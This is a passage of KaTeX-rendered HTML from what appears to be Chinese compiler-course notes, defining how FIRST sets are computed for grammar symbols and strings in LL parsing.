stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\epsilon \in FIRST(X)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">ϵ</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.13889em;">RST</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose">)</span></span></span></span></eq></li></ol></li><li><ol start="3"><li>若<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi><mo>∈</mo><msub><mi>V</mi><mi>N</mi></msub></mrow><annotation encoding="application/x-tex">X\in V_N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7224em;vertical-align:-0.0391em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">N</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>,相应产生式为<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi><mo>→</mo><mi>Y</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><mi>Y</mi><mo>∈</mo><msub><mi>V</mi><mi>N</mi></msub></mrow><annotation encoding="application/x-tex">X \rightarrow Y..,Y\in V_N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mord">..</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">N</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>,则<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mi>I</mi><mi>R</mi><mi>S</mi><mi>T</mi><mo stretchy="false">(</mo><mi>Y</mi><mo stretchy="false">)</mo><mo>−</mo><mo stretchy="false">{</mo><mi>ϵ</mi><mo stretchy="false">}</mo><mo>⊂</mo><mi>F</mi><mi>I</mi><mi>R</mi><mi>S</mi><mi>T</mi><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">FIRST(Y)-\{\epsilon\}\subset FIRST(X)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.13889em;">RST</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord mathnormal">ϵ</span><span class="mclose">}</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">⊂</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.13889em;">RST</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose">)</span></span></span></span></eq><br>如果有产生式<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi><mo>→</mo><msub><mi>Y</mi><mn>1</mn></msub><msub><mi>Y</mi><mn>2</mn></msub><mo>…</mo><msub><mi>Y</mi><mi>k</mi></msub></mrow><annotation encoding="application/x-tex">X\rightarrow Y_1Y_2…Y_k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>（其中，<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>Y</mi><mn>1</mn></msub><mtext>，</mtext><msub><mi>Y</mi><mn>2</mn></msub><mtext>，</mtext><mo>…</mo><mtext>，</mtext><msub><mi>Y</mi><mrow><mi>i</mi><mo>−</mo><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">Y_1，Y_2，…，Y_{i-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8917em;vertical-align:-0.2083em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">，</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">，</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord cjk_fallback">，</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span></span></span></span></eq>都是非终结符，且<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>Y</mi><mn>1</mn></msub><msub><mi>Y</mi><mn>2</mn></msub><mo>…</mo><msub><mi>Y</mi><mrow><mi>i</mi><mtext>–</mtext><mn>1</mn></mrow></msub><msup><mo>→</mo><mo>∗</mo></msup><mo stretchy="false">{</mo><mi>ϵ</mi><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">Y_1Y_2…Y_{i–1}\rightarrow^*\{\epsilon\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8387em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mord mtight">–1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel"><span class="mrel">→</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6887em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord mathnormal">ϵ</span><span class="mclose">}</span></span></span></span></eq>则<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mi>I</mi><mi>R</mi><mi>S</mi><mi>T</mi><mo stretchy="false">(</mo><msub><mi>Y</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo>−</mo><mo stretchy="false">{</mo><mi>ϵ</mi><mo stretchy="false">}</mo><mo>⊂</mo><mi>F</mi><mi>I</mi><mi>R</mi><mi>S</mi><mi>T</mi><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo><mo separator="true">;</mo></mrow><annotation encoding="application/x-tex">FIRST(Y_i)-\{\epsilon\}\subset FIRST(X);</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.13889em;">RST</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord mathnormal">ϵ</span><span class="mclose">}</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">⊂</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.13889em;">RST</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose">)</span><span class="mpunct">;</span></span></span></span></eq>如果<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>Y</mi><mn>1</mn></msub><msub><mi>Y</mi><mn>2</mn></msub><mo>…</mo><msub><mi>Y</mi><mi>k</mi></msub><msup><mo>→</mo><mo lspace="0em" rspace="0em">∗</mo></msup><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">Y_1Y_2…Y_k\rightarrow^{*}\epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8387em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel"><span class="mrel">→</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6887em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">∗</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">ϵ</span></span></span></span></eq>，则<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϵ</mi><mo>∈</mo><mi>F</mi><mi>I</mi><mi>R</mi><mi>S</mi><mi>T</mi><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\epsilon \in FIRST(X)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">ϵ</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.13889em;">RST</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose">)</span></span></span></span></eq>。</li></ol></li></ul></li><li>若 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>α</mi><mo>=</mo><mo stretchy="false">(</mo><msub><mi>V</mi><mi>U</mi></msub><mo>⋃</mo><msub><mi>V</mi><mi>T</mi></msub><msup><mo stretchy="false">)</mo><mo>∗</mo></msup><mo separator="true">,</mo><mi>α</mi><mo>=</mo><msub><mi>X</mi><mn>1</mn></msub><msub><mi>X</mi><mn>2</mn></msub><msub><mi>X</mi><mn>3</mn></msub><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>X</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">\alpha=(V_U \bigcup V_T)^*,\alpha = X_1X_2X_3..X_n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">U</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop op-symbol small-op" style="position:relative;top:0em;">⋃</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6887em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">..</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>,<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mi>I</mi><mi>R</mi><mi>S</mi><mi>T</mi><mo stretchy="false">(</mo><mi>α</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">FIRST(\alpha)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.13889em;">RST</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mclose">)</span></span></span></span></eq>构造为<ul><li><ol><li>若<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>α</mi><mo>=</mo><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">\alpha=\epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">ϵ</span></span></span></span></eq>,显然<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mi>I</mi><mi>R</mi><mi>S</mi><mi>T</mi><mo stretchy="false">(</mo><mi>α</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">{</mo><mi>ϵ</mi><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">FIRST(\alpha)=\{\epsilon\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.13889em;">RST</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord mathnormal">ϵ</span><span class="mclose">}</span></span></span></span></eq></li></ol></li><li><ol start="2"><li>若<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>α</mi><mo>≠</mo><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">\alpha\not=\epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel"><span class="mord vbox"><span class="thinbox"><span class="rlap"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="inner"><span class="mord"><span class="mrel"></span></span></span><span class="fix"></span></span></span></span></span></span><span class="base"><span class="strut" style="height:0.3669em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">ϵ</span></span></span></span></eq>,则<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>则</mtext><mi>F</mi><mi>I</mi><mi>R</mi><mi>S</mi><mi>T</mi><mo stretchy="false">(</mo><msub><mi>X</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mo>−</mo><mo stretchy="false">{</mo><mi>ϵ</mi><mo stretchy="false">}</mo><mo>⊂</mo><mi>F</mi><mi>I</mi><mi>R</mi><mi>S</mi><mi>T</mi><mo stretchy="false">(</mo><mi>α</mi><mo stretchy="false">)</mo><mtext>；</mtext></mrow><annotation encoding="application/x-tex">则FIRST(X_1)-\{\epsilon\}\subset FIRST(\alpha)；</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback">则</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.13889em;">RST</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord mathnormal">ϵ</span><span class="mclose">}</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">⊂</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" 